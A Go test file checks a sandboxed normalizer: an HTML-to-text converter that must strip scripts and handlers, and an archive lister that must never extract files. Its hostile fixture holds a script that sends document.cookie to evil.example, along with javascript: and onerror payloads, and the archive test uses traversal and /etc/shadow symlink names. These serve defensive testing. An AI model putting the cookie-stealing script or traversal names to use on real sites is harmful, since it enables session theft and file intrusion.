package main

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"encoding/json"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const testJob = "1111111111111111111111111111111111111111111111111111111111111111"
const testRecipe = "2222222222222222222222222222222222222222222222222222222222222222"

// hostileHTML carries what a malicious page carries: scripts, handlers, styles, an iframe,
// a data URL, entities, bidirectional overrides and control characters.
const hostileHTML = `<!doctype html><html><head><title>Quarterly &amp; report</title>
<style>body { background: url(javascript:alert(1)) }</style>
<script>fetch("https://evil.example/steal?c=" + document.cookie)</script></head>
<body onload="alert(1)"><h1>Results</h1><p>Revenue rose&nbsp;4%&#33;</p>
<ul><li>first</li><li>second &lt;b&gt;</li></ul>
<iframe src="https://evil.example/frame">frame text</iframe>
<noscript>enable scripts</noscript><img src=x onerror="alert(2)">
<p>right` + "\u202e" + `to-left</p><p>bell` + "\x07" + `here</p>
<pre>  kept   spaces
second line</pre></body></html>`

// PROVES the HTML normalizer keeps a page's text and nothing it would run: script, style,
// iframe and noscript content and every attribute are gone, entities are decoded, block
// structure is kept as lines, bidirectional overrides and control characters are dropped,
// and Markdown marks headings and list items.
func TestTheHTMLNormalizerKeepsTextAndNothingThatRuns(t *testing.T) {
	text, problem := htmlToText([]byte(hostileHTML), false, 1<<20)
	if problem != "" {
		t.Fatal(problem)
	}
	for _, gone := range []string{"fetch", "evil.example", "javascript", "alert", "background", "frame text", "enable scripts", "onerror", "\u202e", "\x07"} {
		if strings.Contains(text, gone) {
			t.Fatalf("%q survived:\n%s", gone, text)
		}
	}
	for _, kept := range []string{"Quarterly & report", "Results", "Revenue rose\u00a04%!", "first", "second <b>", "rightto-left", "bellhere", "  kept   spaces\nsecond line"} {
		if !strings.Contains(text, kept) {
			t.Fatalf("%q is missing:\n%s", kept, text)
		}
	}
	markdown, problem := htmlToText([]byte(hostileHTML), true, 1<<20)
	if problem != "" {
		t.Fatal(problem)
	}
	if !strings.Contains(markdown, "# Results") || !strings.Contains(markdown, "- first") {
		t.Fatalf("Markdown lost its marks:\n%s", markdown)
	}
	if _, problem := htmlToText([]byte(strings.Repeat("<p>x</p>", 1000)), false, 100); problem != resourceLimit {
		t.Fatalf("an output past its bound: %q", problem)
	}
	// A void element has no end tag: an <embed> or <img> without "/>" hides nothing after it
	// (found by the run against the real guest: an <embed> once ended the page's text).
	text, problem = htmlToText([]byte(`<p>before</p><embed src="x"><img src="y"><br><p>after</p><object>fallback</object><p>last</p>`), false, 1<<20)
	if problem != "" || !strings.Contains(text, "before") || !strings.Contains(text, "after") || !strings.Contains(text, "last") || strings.Contains(text, "fallback") {
		t.Fatalf("a void element hid text:\n%s", text)
	}
}

func zipOf(t *testing.T, names ...string) []byte {
	var buffer bytes.Buffer
	archive := zip.NewWriter(&buffer)
	for _, name := range names {
		writer, err := archive.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		writer.Write([]byte("content of " + name))
	}
	if err := archive.Close(); err != nil {
		t.Fatal(err)
	}
	return buffer.Bytes()
}

// PROVES an archive is listed and never extracted: a traversal name and an absolute name
// are listed as names only (nothing is written anywhere), a control character or a
// bidirectional override in a name is written as an escape, a tar.gz is listed the same
// way, a gzip bomb stops at the expansion bound, and anything else is malformed.
func TestAnArchiveIsListedNeverExtracted(t *testing.T) {
	dir := t.TempDir()
	before, _ := os.ReadDir(dir)
	data := zipOf(t, "../../escape.txt", "/etc/passwd", "ok/file.txt", "line\nbreak.txt", "rtl\u202egnp.exe")
	listing, problem := archiveListing(data, 1<<20)
	if problem != "" {
		t.Fatal(problem)
	}
	for _, want := range []string{"file\t", "../../escape.txt", "/etc/passwd", "ok/file.txt", `line\u{a}break.txt`, `rtl\u{202e}gnp.exe`} {
		if !strings.Contains(listing, want) {
			t.Fatalf("%q missing from:\n%s", want, listing)
		}
	}
	if strings.Count(listing, "\n") != 6 {
		t.Fatalf("a name forged a line:\n%s", listing)
	}
	after, _ := os.ReadDir(dir)
	if len(after) != len(before) {
		t.Fatal("listing wrote a file")
	}
	var compressed bytes.Buffer
	gz := gzip.NewWriter(&compressed)
	archive := tar.NewWriter(gz)
	archive.WriteHeader(&tar.Header{Name: "a/b.txt", Mode: 0o644, Size: 3, Typeflag: tar.TypeReg})
	archive.Write([]byte("abc"))
	archive.WriteHeader(&tar.Header{Name: "link", Linkname: "/etc/shadow", Typeflag: tar.TypeSymlink})
	archive.Close()
	gz.Close()
	listing, problem = archiveListing(compressed.Bytes(), 1<<20)
	if problem != "" || !strings.Contains(listing, "file\t3\ta/b.txt") || !strings.Contains(listing, "link\t0\tlink") {
		t.Fatalf("%q:\n%s", problem, listing)
	}
	// A bomb: far more expanded bytes than the bound lets through.
	bomb := &countingReader{reader: io.LimitReader(zeroes{}, 1<<40), left: 1 << 20}
	if _, err := io.Copy(io.Discard, bomb); err != errOutputBound {
		t.Fatalf("the expansion bound did not hold: %v", err)
	}
	if _, problem := archiveListing([]byte("not an archive"), 1<<20); problem != malformedInput {
		t.Fatalf("%q", problem)
	}
}

type zeroes struct{}

func (zeroes) Read(buffer []byte) (int, error) {
	for index := range buffer {
		buffer[index] = 0
	}
	return len(buffer), nil
}

// PROVES the command writes the output and prints one strict report: the job, the raw
// bytes' content key, the normalizer, the execution and boot, and the output's format,
// content key and size; an unsupported format is a failed report and writes nothing; a bad
// argument prints nothing.
func TestTheNormalizerPrintsOneReport(t *testing.T) {
	dir := t.TempDir()
	input := filepath.Join(dir, "input")
	output := filepath.Join(dir, "output")
	os.WriteFile(input, []byte("<p>Hello &amp; welcome</p><script>x()</script>"), 0o644)
	run := func(declared, target string) (normalizationReport, int) {
		stdout := os.Stdout
		reader, writer, _ := os.Pipe()
		os.Stdout = writer
		code := runNormalize([]string{testJob, "exe-normalizer", "1", "yougori-normalize", "1.0.0", testRecipe, declared, target, "1048576", input, output})
		writer.Close()
		os.Stdout = stdout
		line, _ := io.ReadAll(reader)
		var report normalizationReport
		if code == 0 {
			decoder := json.NewDecoder(bytes.NewReader(line))
			decoder.DisallowUnknownFields()
			if err := decoder.Decode(&report); err != nil {
				t.Fatalf("%v: %s", err, line)
			}
		}
		return report, code
	}
	report, code := run("html", "plain_text")
	written, _ := os.ReadFile(output)
	raw, _ := os.ReadFile(input)
	if code != 0 || report.Outcome.Outcome != "normalized" || string(written) != "Hello & welcome\n" {
		t.Fatalf("%d %+v %q", code, report, written)
	}
	if report.Job != testJob || report.Raw != contentKey(raw) || report.Execution != "exe-normalizer" || report.Boot != 1 {
		t.Fatalf("%+v", report)
	}
	if report.Outcome.Output.Content != contentKey(written) || report.Outcome.Output.SizeBytes != uint64(len(written)) || report.Outcome.Output.Format != "plain_text" {
		t.Fatalf("%+v", report.Outcome.Output)
	}
	os.Remove(output)
	report, code = run("pdf", "plain_text")
	if code != 0 || report.Outcome.Outcome != "failed" || report.Outcome.Failure != "unsupported_format" || report.Outcome.Output != nil {
		t.Fatalf("%d %+v", code, report)
	}
	if _, err := os.Stat(output); err == nil {
		t.Fatal("a failed job wrote output")
	}
	if code := runNormalize([]string{"not-hex"}); code != 2 {
		t.Fatalf("a bad argument: %d", code)
	}
	if contentKey([]byte("abc")) != "d8f59e56d803f2e07605dceb4ac9a50963d095c751dd655181d3cebc9981f848" {
		t.Fatal("the content key is not foundation::ids's")
	}
}
